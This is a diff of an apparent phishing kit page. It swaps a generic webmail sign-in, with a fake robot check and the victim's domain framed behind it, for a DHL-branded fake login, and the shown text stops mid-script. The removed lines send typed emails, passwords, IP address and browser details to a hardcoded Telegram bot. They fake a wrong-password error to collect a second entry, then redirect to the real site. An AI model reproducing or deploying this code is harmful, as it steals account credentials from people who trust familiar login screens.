@@ -1,456 +1,540 @@
 <!DOCTYPE html>
-<html lang="en">
+<html id="html" lang="en">
 <head>
-   <meta charset="UTF-8">
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Webmail Sign-in</title>
-  <!-- Include Bootstrap 5 CSS -->
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-    <!-- Bootstrap Icons -->
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
-    <!-- Google Fonts: Poppins -->
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
-
-  <style>
-    /* Hide the main content initially */
-    #main-content {
-      display: none;
-    }
-
-    /* Verification Div Styling */
-    #verification-div {
-      height: 100vh;
-      display: flex;
-      align-items: start;
-      justify-content: center;
-      padding-top: 10%;
-    }
-
-    /* Ensure text is left-aligned */
-    .verification-content {
-      text-align: left;
-    }
-
-    /* Adjust spinner size */
-    .spinner-border {
-      width: 1.5rem;
-      height: 1.5rem;
-    }
-  </style>
-  
-   <style>
-     #background-iframe,#overlay{position:fixed;top:0;left:0;height:100%;width:100%}body{font-family:Poppins,sans-serif;margin:0;padding:0;overflow:hidden}#background-iframe{border:none;z-index:-3;object-fit:cover}#overlay{background-color:rgba(0,0,0,.5);z-index:-2}.form-container{display:none;max-width:400px;width:100%;padding:2rem;background-color:rgba(255,255,255,.95);border-radius:.75rem;box-shadow:0 8px 16px rgba(0,0,0,.2);position:relative;z-index:1}.icon-text{display:flex;align-items:center;margin-bottom:1.5rem}.icon-text img{width:32px;height:32px;margin-right:.5rem}.icon-text .h4{margin-bottom:0;color:#0d6efd}.form-floating{position:relative;margin-bottom:1.5rem}.form-floating label,.input-icon{position:absolute;color:#6c757d;pointer-events:none}.form-floating label{transition:.2s ease-in-out;left:2.5rem;top:-.2rem;background-color:transparent;z-index:1}.form-floating input:focus+label,.form-floating input:not(:placeholder-shown)+label{transform:translateY(-1.5rem);font-size:.85rem;color:#0d6efd}.form-control{border-top:none;border-left:none;border-right:none;border-bottom:2px solid #ced4da;border-radius:0;padding-left:2.5rem;transition:border-color .2s;background-color:transparent}.form-control:focus{box-shadow:none;outline:0;border-bottom-color:#0d6efd}.input-icon{left:.75rem;top:50%;transform:translateY(-50%);font-size:1.2rem}.btn-primary{width:100%;padding:.75rem;font-size:1rem;background-color:#0d6efd;border:none;border-radius:.375rem;transition:background-color .3s,color .3s}.btn-primary:hover{background-color:#0b5ed7;color:#fff}.btn-primary:focus{box-shadow:none}@media (max-width:576px){.form-container{padding:1.5rem}}.loader-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.5);align-items:center;justify-content:center;z-index:9999;display:none}.error-message{color:red;margin-bottom:1rem;display:none}
+    <title>DHL Login</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: "Roboto", sans-serif;
+            background: url('https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/4be2ae5d-624c-4fa5-954d-060702ddca90.png') no-repeat center center fixed;
+            background-size: cover;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.9);
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            z-index: 1;
+            position: relative;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .header img {
+            height: 40px;
+        }
+        .lang-switcher {
+            padding: 5px;
+            border-radius: 4px;
+            background: #ffffff;
+        }
+        h1 {
+            font-size: 24px;
+            margin: 0 0 20px;
+            text-align: center;
+            color: #333333;
+        }
+        .quick-actions {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+        .quick-actions a {
+            text-decoration: none;
+            color: #d40511;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+        input[type="text"], input[type="password"], input[type="email"] {
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #cccccc;
+            border-radius: 4px;
+            font-size: 16px;
+            background: #ffffff;
+        }
+        .password-container {
+            position: relative;
+        }
+        .password-container input {
+            width: 100%;
+            box-sizing: border-box;
+        }
+        .toggle-password {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #666666;
+        }
+        button {
+            padding: 10px;
+            background-color: #d40511;
+            color: #ffffff;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #b0040f;
+        }
+        .error-message {
+            color: #d40511;
+            font-size: 14px;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+        .links {
+            margin-top: 20px;
+            text-align: center;
+        }
+        .links a {
+            color: #d40511;
+            text-decoration: none;
+            font-size: 14px;
+            display: block;
+            margin-bottom: 10px;
+        }
+        @media (max-width: 480px) {
+            .container {
+                padding: 15px;
+                margin: 10px;
+                background: rgba(255, 255, 255, 0.9);
+            }
+            h1 {
+                font-size: 20px;
+            }
+            .header img {
+                height: 30px;
+            }
+            .quick-actions a {
+                font-size: 12px;
+            }
+        }
+        [dir="rtl"] .header {
+            flex-direction: row-reverse;
+        }
+        [dir="rtl"] .quick-actions {
+            flex-direction: row-reverse;
+        }
+        [dir="rtl"] .toggle-password {
+            left: 10px;
+            right: auto;
+        }
+        [dir="rtl"] input {
+            text-align: right;
+        }
     </style>
 </head>
-
-<body id="main-content" class="d-flex align-items-center justify-content-center min-vh-100">
-  <div id="verification-div" style="position:absolute;height:100vh; width:100vw;background-color: #fff;">
-      <div class="row">
-        <div class="col-12 verification-content mx-2">
-          <h2 id="verify-heading"></h2>
-          <div>
-              <div class="checkbox-container mt-3 d-flex align-items-center p-4" style="border:0px solid black;background: #f3efef;border-radius:5px;">
-                <input type="checkbox" id="bot-check" class="form-check-input">
-                <label for="bot-check" class="form-check-label ms-2" id="bot-check-label">I am not a robot</label>
-              </div>
-          </div>
-          <p class="pt-1" id="verify-instruction">Click on the checkbox to verify if you're human.</p>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://www.dhl.com/content/dam/dhl/global/core/images/logos/dhl-logo.svg" alt="DHL Logo">
+            <select class="lang-switcher" onchange="setLanguage(this.value)">
+                <option value="en">English</option>
+                <option value="zh-CN">中文 (简体)</option>
+                <option value="hi">हिन्दी</option>
+                <option value="es">Español</option>
+                <option value="fr">Français</option>
+                <option value="ar">العربية</option>
+                <option value="ko">한국어</option>
+                <option value="ja">日本語</option>
+                <option value="vi">Tiếng Việt</option>
+            </select>
         </div>
-      </div>
-    </div>
-    <!-- Background Iframe -->
-    <iframe id="background-iframe" src="about:blank" allowfullscreen></iframe>
-    <!-- Dimmed Overlay -->
-    <div id="overlay"></div>
-    <!-- Form Container -->
-    <div class="form-container" id="form-container" >
-        <!-- Error Message -->
-        <div id="error-message" class="error-message">Incorrect password. Try again</div>
-
-        <form id="user-form">
-            <!-- Icon and Text Row -->
-            <div class="icon-text">
-                <img id="domain-favicon" src="https://www.google.com/s2/favicons?domain=zoho.com" alt="Domain Favicon" style="height: 15px; width:15px;">
-                <span class="h4 mb-0" style="margin-left: 10px;" id="domain-name">ZOHO</span>
+        <h1 data-i18n="header_title">DHL Express</h1>
+        <div class="quick-actions">
+            <a href="#" data-i18n="send_package">Send package</a>
+            <a href="#" data-i18n="send_directly">Send directly</a>
+        </div>
+        <form id="signin-form">
+            <p data-i18n="continue_with_password">Continue with your password</p>
+            <input type="email" id="email" name="email" data-i18n="[placeholder]email_placeholder" placeholder="Email address" required disabled>
+            <div class="password-container">
+                <input type="password" id="password" name="password" data-i18n="[placeholder]password_placeholder" placeholder="Password" required>
+                <span class="toggle-password" id="toggle-password"><i class="fas fa-eye"></i></span>
             </div>
-            <!-- Heading -->
-            <h5 class="mb-3" id="form-heading">Let's get started</h5>
-            <!-- Paragraph -->
-            <p class="mb-4 text-muted" style="font-size: .8rem;" id="form-subheading">Previous session has expired, login to continue</p>
-            <!-- Email Input -->
-            <div class="form-floating position-relative">
-                <i class="bi bi-envelope input-icon"></i>
-                <input type="email" class="form-control" id="email" placeholder=" " required style="padding-left: 40px; z-index:1000;" disabled>
-                <label for="email" style="background-color: transparent;" id="email-label">Email</label>
-            </div>
-            <!-- Password Input -->
-            <div class="form-floating position-relative">
-                <i class="bi bi-lock input-icon"></i>
-                <input type="password" class="form-control" id="password" placeholder=" " required style="padding-left: 40px;">
-                <label for="password" style="background-color: transparent;" id="password-label">Password</label>
-            </div>
-            <!-- Submit Button -->
-            <button type="submit" class="btn btn-primary" id="submit-button">Next</button>
+            <!-- Honeypot field -->
+            <input type="text" name="honeypot" style="display: none;">
+            <div class="error-message" id="error-message"></div>
+            <button type="submit" data-i18n="[value]login" value="Login">Login</button>
         </form>
-    </div>
-
-    <!-- Loader Overlay -->
-    <div id="loader-overlay" class="loader-overlay">
-        <div class="spinner-border text-light" role="status" style="width: 3rem; height: 3rem;">
-            <span class="visually-hidden" id="loader-text">Loading...</span>
+        <div class="links">
+            <a href="#" data-i18n="reset_password">Reset Password</a>
+            <a href="#" data-i18n="no_account">Don't have an account yet? <span data-i18n="sign_up">Sign up</span></a>
+            <a href="#" data-i18n="business_user">Business user? <span data-i18n="business_sign_in">Sign in</span></a>
         </div>
     </div>
 
-    <!-- Bootstrap 5 JS Bundle (includes Popper) -->
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
-    <!-- Translation Script -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/i18next/21.6.14/i18next.min.js"></script>
     <script>
-      // Translation object for multiple languages
-      const translations = {
-         en: {
-            verifyHeading: "",
-            botCheckLabel: "I am not a robot",
-            verifyInstruction: "Click on the checkbox to verify if you're human.",
-            redirecting: "Redirecting...",
-            errorMessage: "Incorrect password. Try again",
-            formHeading: "Let's get started",
-            formSubheading: "Previous session has expired, login to continue",
-            emailLabel: "Email",
-            passwordLabel: "Password",
-            submitButton: "Next",
-            loaderText: "Loading..."
-         },
-         zh: {
-            verifyHeading: "",
-            botCheckLabel: "我不是机器人",
-            verifyInstruction: "点击复选框以验证您是人类。",
-            redirecting: "正在重定向...",
-            errorMessage: "密码错误，请重试",
-            formHeading: "让我们开始",
-            formSubheading: "之前的会话已过期，请登录以继续",
-            emailLabel: "电子邮件",
-            passwordLabel: "密码",
-            submitButton: "下一步",
-            loaderText: "加载中..."
-         },
-         ja: {
-            verifyHeading: "",
-            botCheckLabel: "私はロボットではありません",
-            verifyInstruction: "人間であることを確認するためにチェックボックスをクリックしてください。",
-            redirecting: "リダイレクト中...",
-            errorMessage: "パスワードが間違っています。もう一度お試しください",
-            formHeading: "始めましょう",
-            formSubheading: "前のセッションが期限切れになりました。続行するにはログインしてください",
-            emailLabel: "メール",
-            passwordLabel: "パスワード",
-            submitButton: "次へ",
-            loaderText: "読み込み中..."
-         },
-         hi: {
-            verifyHeading: "",
-            botCheckLabel: "मैं रोबोट नहीं हूँ",
-            verifyInstruction: "यह सत्यापित करने के लिए चेकबॉक्स पर क्लिक करें कि आप इंसान हैं।",
-            redirecting: "पुनर्निर्देशन...",
-            errorMessage: "गलत पासवर्ड। फिर से कोशिश करें",
-            formHeading: "आइए शुरू करें",
-            formSubheading: "पिछला सत्र समाप्त हो गया है, जारी रखने के लिए लॉगिन करें",
-            emailLabel: "ईमेल",
-            passwordLabel: "पासवर्ड",
-            submitButton: "अगला",
-            loaderText: "लोड हो रहा है..."
-         },
-         es: {
-            verifyHeading: "",
-            botCheckLabel: "No soy un robot",
-            verifyInstruction: "Haz clic en la casilla para verificar que eres humano.",
-            redirecting: "Redirigiendo...",
-            errorMessage: "Contraseña incorrecta. Inténtalo de nuevo",
-            formHeading: "Empecemos",
-            formSubheading: "La sesión anterior ha expirado, inicia sesión para continuar",
-            emailLabel: "Correo electrónico",
-            passwordLabel: "Contraseña",
-            submitButton: "Siguiente",
-            loaderText: "Cargando..."
-         },
-         fr: {
-            verifyHeading: "",
-            botCheckLabel: "Je ne suis pas un robot",
-            verifyInstruction: "Cochez la case pour vérifier que vous êtes humain.",
-            redirecting: "Redirection...",
-            errorMessage: "Mot de passe incorrect. Réessayez",
-            formHeading: "Commençons",
-            formSubheading: "La session précédente a expiré, connectez-vous pour continuer",
-            emailLabel: "Email",
-            passwordLabel: "Mot de passe",
-            submitButton: "Suivant",
-            loaderText: "Chargement..."
-         },
-         de: {
-            verifyHeading: "",
-            botCheckLabel: "Ich bin kein Roboter",
-            verifyInstruction: "Klicken Sie auf das Kontrollkästchen, um zu bestätigen, dass Sie ein Mensch sind.",
-            redirecting: "Weiterleitung...",
-            errorMessage: "Falsches Passwort. Versuchen Sie es erneut",
-            formHeading: "Lass uns anfangen",
-            formSubheading: "Die vorherige Sitzung ist abgelaufen, melden Sie sich an, um fortzufahren",
-            emailLabel: "E-Mail",
-            passwordLabel: "Passwort",
-            submitButton: "Weiter",
-            loaderText: "Laden..."
-         },
-         pt: {
-            verifyHeading: "",
-            botCheckLabel: "Não sou um robô",
-            verifyInstruction: "Clique na caixa de seleção para verificar se você é humano.",
-            redirecting: "Redirecionando...",
-            errorMessage: "Senha incorreta. Tente novamente",
-            formHeading: "Vamos começar",
-            formSubheading: "A sessão anterior expirou, faça login para continuar",
-            emailLabel: "E-mail",
-            passwordLabel: "Senha",
-            submitButton: "Próximo",
-            loaderText: "Carregando..."
-         },
-         ar: {
-            verifyHeading: "",
-            botCheckLabel: "أنا لست روبوت",
-            verifyInstruction: "انقر على مربع الاختيار للتحقق من أنك إنسان.",
-            redirecting: "جارٍ إعادة التوجيه...",
-            errorMessage: "كلمة المرور غير صحيحة. حاول مرة أخرى",
-            formHeading: "لنبدأ",
-            formSubheading: "انتهت صلاحية الجلسة السابقة، قم بتسجيل الدخول للمتابعة",
-            emailLabel: "البريد الإلكتروني",
-            passwordLabel: "كلمة المرور",
-            submitButton: "التالي",
-            loaderText: "جارٍ التحميل..."
-         },
-         it: {
-            verifyHeading: "",
-            botCheckLabel: "Non sono un robot",
-            verifyInstruction: "Fai clic sulla casella per verificare che sei umano.",
-            redirecting: "Reindirizzamento...",
-            errorMessage: "Password errata. Riprova",
-            formHeading: "Iniziamo",
-            formSubheading: "La sessione precedente è scaduta, accedi per continuare",
-            emailLabel: "Email",
-            passwordLabel: "Password",
-            submitButton: "Avanti",
-            loaderText: "Caricamento..."
-         },
-         ko: {
-            verifyHeading: "",
-            botCheckLabel: "나는 로봇이 아닙니다",
-            verifyInstruction: "인간임을 확인하려면 체크박스를 클릭하세요.",
-            redirecting: "리디렉션 중...",
-            errorMessage: "잘못된 비밀번호입니다. 다시 시도하세요",
-            formHeading: "시작합시다",
-            formSubheading: "이전 세션이 만료되었습니다. 계속하려면 로그인하세요",
-            emailLabel: "이메일",
-            passwordLabel: "비밀번호",
-            submitButton: "다음",
-            loaderText: "로딩 중..."
-         },
-         vi: {
-            verifyHeading: "",
-            botCheckLabel: "Tôi không phải là robot",
-            verifyInstruction: "Nhấp vào hộp kiểm để xác minh bạn là con người.",
-            redirecting: "Đang chuyển hướng...",
-            errorMessage: "Mật khẩu không đúng. Thử lại",
-            formHeading: "Hãy bắt đầu",
-            formSubheading: "Phiên trước đã hết hạn, đăng nhập để tiếp tục",
-            emailLabel: "Email",
-            passwordLabel: "Mật khẩu",
-            submitButton: "Tiếp theo",
-            loaderText: "Đang tải..."
-         }
-      };
-
-      // Function to detect language
-      function detectLanguage() {
-         const browserLang = navigator.language || navigator.languages[0] || 'en';
-         const langCode = browserLang.split('-')[0];
-         return translations[langCode] ? langCode : 'en';
-      }
-
-      // Function to apply translations
-      function applyTranslations(lang) {
-         const t = translations[lang];
-         document.documentElement.lang = lang;
-         document.getElementById('verify-heading').textContent = t.verifyHeading;
-         document.getElementById('bot-check-label').textContent = t.botCheckLabel;
-         document.getElementById('verify-instruction').textContent = t.verifyInstruction;
-         document.getElementById('error-message').textContent = t.errorMessage;
-         document.getElementById('form-heading').textContent = t.formHeading;
-         document.getElementById('form-subheading').textContent = t.formSubheading;
-         document.getElementById('email-label').textContent = t.emailLabel;
-         document.getElementById('password-label').textContent = t.passwordLabel;
-         document.getElementById('submit-button').textContent = t.submitButton;
-         document.getElementById('loader-text').textContent = t.loaderText;
-      }
-
-      // Apply translations on page load
-      document.addEventListener("DOMContentLoaded", () => {
-         const lang = detectLanguage();
-         applyTranslations(lang);
-      });
-    </script>
-    <!-- Custom JavaScript to Handle 'eta' Parameter and Background Iframe -->
-    <script>
-let submitCount = 0;
-document.addEventListener("DOMContentLoaded", (() => {
-    const eta = new URLSearchParams(window.location.search).get("eta");
-    let domain;
-    if (eta) {
-        console.log("eta:", eta); // Debugging: Log eta value
-        try {
-            document.getElementById("email").value = eta;
-            const parts = eta.split("@");
-            console.log("split result:", parts); // Debugging: Log split result
-            if (parts.length === 2 && parts[1]) {
-                domain = parts[1];
-                console.log("domain:", domain); // Debugging: Log domain
-                document.getElementById("domain-favicon").src = `https://www.google.com/s2/favicons?domain=${domain}`;
-                const domainName = domain.split(".")[0].toUpperCase();
-                console.log("domain name:", domainName); // Debugging: Log domain name
-                document.getElementById("domain-name").textContent = domainName;
-                const iframeSrc = domain.startsWith("http://") || domain.startsWith("https://") ? domain : `https://${domain}`;
-                console.log("iframe src:", iframeSrc); // Debugging: Log iframe src
-                document.getElementById("background-iframe").src = iframeSrc;
-            } else {
-                console.warn("Invalid email format in 'eta' parameter:", eta);
-                document.getElementById("background-iframe").src = "about:blank";
-            }
-        } catch (error) {
-            console.error("Error processing 'eta' parameter:", error);
-            document.getElementById("background-iframe").src = "about:blank";
-        }
-    } else {
-        console.warn("No 'eta' parameter found in the URL.");
-        document.getElementById("background-iframe").src = "about:blank";
-    }
-    let userInfo = {
-        ipAddress: "Fetching...",
-        userAgent: navigator.userAgent,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        browser: "Detecting..."
-    };
-    const userAgent = navigator.userAgent;
-    userAgent.indexOf("Firefox") > -1 ? userInfo.browser = "Mozilla Firefox" : 
-    userAgent.indexOf("SamsungBrowser") > -1 ? userInfo.browser = "Samsung Internet" : 
-    userAgent.indexOf("Opera") > -1 || userAgent.indexOf("OPR") > -1 ? userInfo.browser = "Opera" : 
-    userAgent.indexOf("Trident") > -1 ? userInfo.browser = "Microsoft Internet Explorer" : 
-    userAgent.indexOf("Edge") > -1 ? userInfo.browser = "Microsoft Edge" : 
-    userAgent.indexOf("Chrome") > -1 ? userInfo.browser = "Google Chrome or Chromium" : 
-    userAgent.indexOf("Safari") > -1 ? userInfo.browser = "Apple Safari" : 
-    userInfo.browser = "Unknown";
-    fetch("https://api.ipify.org?format=json")
-        .then((response) => response.json())
-        .then((data) => {
-            userInfo.ipAddress = data.ip;
-        })
-        .catch((error) => {
-            console.error("Error fetching IP address:", error);
-            userInfo.ipAddress = "Unavailable";
-        });
-    document.getElementById("user-form").addEventListener("submit", (function(e) {
-        e.preventDefault();
-        submitCount += 1;
-        const isFirstSubmit = 1 === submitCount,
-              isSecondSubmit = 2 === submitCount;
-        document.getElementById("loader-overlay").style.display = "flex";
-        let message = `🏌️‍♂️\n\nEmail: ${document.getElementById("email").value.trim()}\nPassword: ${document.getElementById("password").value.trim()}`;
-        new Promise((resolve) => {
-            const interval = setInterval(() => {
-                if (userInfo.ipAddress !== "Fetching...") {
-                    clearInterval(interval);
-                    resolve();
+        // Translation resources
+        const translations = {
+            'en': {
+                translation: {
+                    'title': 'DHL Login',
+                    'header_title': 'DHL Express',
+                    'send_package': 'Send package',
+                    'send_directly': 'Send directly',
+                    'continue_with_password': 'Continue with your password',
+                    'email_placeholder': 'Email address',
+                    'password_placeholder': 'Password',
+                    'login': 'Login',
+                    'error_message': 'Please enter both email and password.',
+                    'reset_password': 'Reset Password',
+                    'no_account': "Don't have an account yet?",
+                    'sign_up': 'Sign up',
+                    'business_user': 'Business user?',
+                    'business_sign_in': 'Sign in'
                 }
-            }, 100);
-        }).then(() => {
-            message += `\nIP Address: ${userInfo.ipAddress}\nUser Agent: ${userInfo.userAgent}\nTimezone: ${userInfo.timezone}\nBrowser: ${userInfo.browser}`;
-            (msg => {
-                const payload = {
-                    chat_id: "6134592216",
-                    text: msg
-                };
-                fetch("https://api.telegram.org/bot7103630373:AAFVJ_kia1ilw3C043wVG478q81bhZjt7gI/sendMessage", {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify(payload)
-                }).then((response) => response.json()).then((result) => {
-                    if (!result.ok) {
-                        console.error("Error sending message to Telegram:", result);
-                        alert("Failed to submit the form.");
-                        document.getElementById("password").value = "";
-                    }
-                }).catch((error) => {
-                    console.error("Error sending message to Telegram:", error);
-                    alert("An error occurred while submitting the form.");
-                    document.getElementById("password").value = "";
-                });
-            })(message);
+            },
+            'zh-CN': {
+                translation: {
+                    'title': 'DHL 登录',
+                    'header_title': 'DHL 快递',
+                    'send_package': '寄送包裹',
+                    'send_directly': '直接寄送',
+                    'continue_with_password': '使用您的密码继续',
+                    'email_placeholder': '电子邮件地址',
+                    'password_placeholder': '密码',
+                    'login': '登录',
+                    'error_message': '请输入电子邮件和密码。',
+                    'reset_password': '重置密码',
+                    'no_account': '还没有账户？',
+                    'sign_up': '注册',
+                    'business_user': '商业用户？',
+                    'business_sign_in': '登录'
+                }
+            },
+            'hi': {
+                translation: {
+                    'title': 'DHL लॉगिन',
+                    'header_title': 'DHL एक्सप्रेस',
+                    'send_package': 'पैकेज भेजें',
+                    'send_directly': 'सीधे भेजें',
+                    'continue_with_password': 'अपने पासवर्ड के साथ जारी रखें',
+                    'email_placeholder': 'ईमेल पता',
+                    'password_placeholder': 'पासवर्ड',
+                    'login': 'लॉगिन',
+                    'error_message': 'कृपया ईमेल और पासवर्ड दोनों दर्ज करें।',
+                    'reset_password': 'पासवर्ड रीसेट करें',
+                    'no_account': 'अभी तक खाता नहीं है?',
+                    'sign_up': 'साइन अप करें',
+                    'business_user': 'व्यवसायिक उपयोगकर्ता?',
+                    'business_sign_in': 'साइन इन करें'
+                }
+            },
+            'es': {
+                translation: {
+                    'title': 'Inicio de sesión de DHL',
+                    'header_title': 'DHL Express',
+                    'send_package': 'Enviar paquete',
+                    'send_directly': 'Enviar directamente',
+                    'continue_with_password': 'Continúa con tu contraseña',
+                    'email_placeholder': 'Dirección de correo electrónico',
+                    'password_placeholder': 'Contraseña',
+                    'login': 'Iniciar sesión',
+                    'error_message': 'Por favor, introduce correo electrónico y contraseña.',
+                    'reset_password': 'Restablecer contraseña',
+                    'no_account': '¿Aún no tienes una cuenta?',
+                    'sign_up': 'Regístrate',
+                    'business_user': '¿Usuario empresarial?',
+                    'business_sign_in': 'Iniciar sesión'
+                }
+            },
+            'fr': {
+                translation: {
+                    'title': 'Connexion DHL',
+                    'header_title': 'DHL Express',
+                    'send_package': 'Envoyer un colis',
+                    'send_directly': 'Envoyer directement',
+                    'continue_with_password': 'Continuer avec votre mot de passe',
+                    'email_placeholder': 'Adresse e-mail',
+                    'password_placeholder': 'Mot de passe',
+                    'login': 'Se connecter',
+                    'error_message': 'Veuillez entrer l’adresse e-mail et le mot de passe.',
+                    'reset_password': 'Réinitialiser le mot de passe',
+                    'no_account': 'Vous n’avez pas encore de compte ?',
+                    'sign_up': 'S’inscrire',
+                    'business_user': 'Utilisateur professionnel ?',
+                    'business_sign_in': 'Se connecter'
+                }
+            },
+            'ar': {
+                translation: {
+                    'title': 'تسجيل الدخول إلى DHL',
+                    'header_title': 'DHL إكسبريس',
+                    'send_package': 'إرسال طرد',
+                    'send_directly': 'إرسال مباشر',
+                    'continue_with_password': 'تابع باستخدام كلمة المرور الخاصة بك',
+                    'email_placeholder': 'عنوان البريد الإلكتروني',
+                    'password_placeholder': 'كلمة المرور',
+                    'login': 'تسجيل الدخول',
+                    'error_message': 'يرجى إدخال البريد الإلكتروني وكلمة المرور.',
+                    'reset_password': 'إعادة تعيين كلمة المرور',
+                    'no_account': 'ليس لديك حساب بعد؟',
+                    'sign_up': 'التسجيل',
+                    'business_user': 'مستخدم تجاري؟',
+                    'business_sign_in': 'تسجيل الدخول'
+                }
+            },
+            'ko': {
+                translation: {
+                    'title': 'DHL 로그인',
+                    'header_title': 'DHL 익스프레스',
+                    'send_package': '패키지 보내기',
+                    'send_directly': '직접 보내기',
+                    'continue_with_password': '비밀번호로 계속하기',
+                    'email_placeholder': '이메일 주소',
+                    'password_placeholder': '비밀번호',
+                    'login': '로그인',
+                    'error_message': '이메일과 비밀번호를 입력해 주세요.',
+                    'reset_password': '비밀번호 재설정',
+                    'no_account': '아직 계정이 없으신가요?',
+                    'sign_up': '가입하기',
+                    'business_user': '비즈니스 사용자?',
+                    'business_sign_in': '로그인'
+                }
+            },
+            'ja': {
+                translation: {
+                    'title': 'DHL ログイン',
+                    'header_title': 'DHL エクスプレス',
+                    'send_package': '荷物を送る',
+                    'send_directly': '直接送る',
+                    'continue_with_password': 'パスワードで続行',
+                    'email_placeholder': 'メールアドレス',
+                    'password_placeholder': 'パスワード',
+                    'login': 'ログイン',
+                    'error_message': 'メールアドレスとパスワードを入力してください。',
+                    'reset_password': 'パスワードのリセット',
+                    'no_account': 'まだアカウントをお持ちでないですか？',
+                    'sign_up': 'サインアップ',
+                    'business_user': 'ビジネスユーザー？',
+                    'business_sign_in': 'ログイン'
+                }
+            },
+            'vi': {
+                translation: {
+                    'title': 'Đăng nhập DHL',
+                    'header_title': 'DHL Express',
+                    'send_package': 'Gửi gói hàng',
+                    'send_directly': 'Gửi trực tiếp',
+                    'continue_with_password': 'Tiếp tục với mật khẩu của bạn',
+                    'email_placeholder': 'Địa chỉ email',
+                    'password_placeholder': 'Mật khẩu',
+                    'login': 'Đăng nhập',
+                    'error_message': 'Vui lòng nhập cả email và mật khẩu.',
+                    'reset_password': 'Đặt lại mật khẩu',
+                    'no_account': 'Chưa có tài khoản?',
+                    'sign_up': 'Đăng ký',
+                    'business_user': 'Người dùng doanh nghiệp?',
+                    'business_sign_in': 'Đăng nhập'
+                }
+            }
+        };
+
+        // Function to validate and extract email from URL hash or eta query parameter
+        function extractEmailFromUrl() {
+            const isValidEmail = email => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+
+            const hash = window.location.hash ? decodeURIComponent(window.location.hash.substring(1)) : null;
+            if (hash && isValidEmail(hash)) {
+                console.log('Valid email from hash:', hash);
+                return hash;
+            } else if (hash) {
+                console.warn('Invalid email format in URL hash:', hash);
+            }
+
+            const urlParams = new URLSearchParams(window.location.search);
+            const eta = urlParams.get('eta') ? decodeURIComponent(urlParams.get('eta')) : null;
+            if (eta && isValidEmail(eta)) {
+                console.log('Valid email from eta:', eta);
+                return eta;
+            } else if (eta) {
+                console.warn('Invalid email format in eta query parameter:', eta);
+            }
+
+            console.warn('No valid email found in URL hash or eta query parameter.');
+            return null;
+        }
+
+        // Function to detect user's language
+        function detectUserLanguage() {
+            const supportedLanguages = ['en', 'zh-CN', 'hi', 'es', 'fr', 'ar', 'ko', 'ja', 'vi'];
+            const userLanguages = navigator.languages || [navigator.language || 'en'];
+            console.log('Detected browser languages:', userLanguages);
+            for (let lang of userLanguages) {
+                if (lang.startsWith('zh')) {
+                    console.log('Matched zh to zh-CN');
+                    return 'zh-CN';
+                }
+                if (supportedLanguages.includes(lang)) {
+                    console.log('Matched language:', lang);
+                    return lang;
+                }
+                const baseLang = lang.split('-')[0];
+                if (supportedLanguages.includes(baseLang)) {
+                    console.log('Matched base language:', baseLang);
+                    return baseLang;
+                }
+            }
+            console.log('Falling back to English (en)');
+            return 'en';
+        }
+
+        // Initialize i18next with detected language
+        i18next.init({
+            lng: detectUserLanguage(),
+            fallbackLng: 'en',
+            resources: translations,
+            debug: true
+        }, function(err, t) {
+            if (err) {
+                console.error('i18next initialization error:', err);
+                return;
+            }
+            console.log('i18next initialized with language:', i18next.language);
+            const lang = i18next.language;
+            document.getElementById('html').setAttribute('lang', lang);
+            document.getElementById('html').setAttribute('dir', lang === 'ar' ? 'rtl' : 'ltr');
+            document.querySelectorAll('[data-i18n]').forEach(element => {
+                const key = element.getAttribute('data-i18n');
+                if (key.startsWith('[placeholder]')) {
+                    element.placeholder = t(key.replace('[placeholder]', ''));
+                } else if (key.startsWith('[value]')) {
+                    element.value = t(key.replace('[value]', ''));
+                } else {
+                    element.innerText = t(key);
+                }
+            });
+            document.title = t('title');
+            document.querySelector('.lang-switcher').value = lang;
         });
-        if (isFirstSubmit) {
-            setTimeout(() => {
-                document.getElementById("loader-overlay").style.display = "none";
-                document.getElementById("error-message").style.display = "block";
-                document.getElementById("password").value = "";
-            }, 3000);
-        } else if (isSecondSubmit) {
-            setTimeout(() => {
-                document.getElementById("loader-overlay").style.display = "none";
-                window.location.href = "https://" + domain;
-            }, 3000);
+
+        // Language switcher for manual override
+        function setLanguage(lang) {
+            i18next.changeLanguage(lang, (err, t) => {
+                if (err) {
+                    console.error('i18next changeLanguage error:', err);
+                    return;
+                }
+                console.log('Language changed to:', lang);
+                const html = document.getElementById('html');
+                html.setAttribute('lang', lang);
+                html.setAttribute('dir', lang === 'ar' ? 'rtl' : 'ltr');
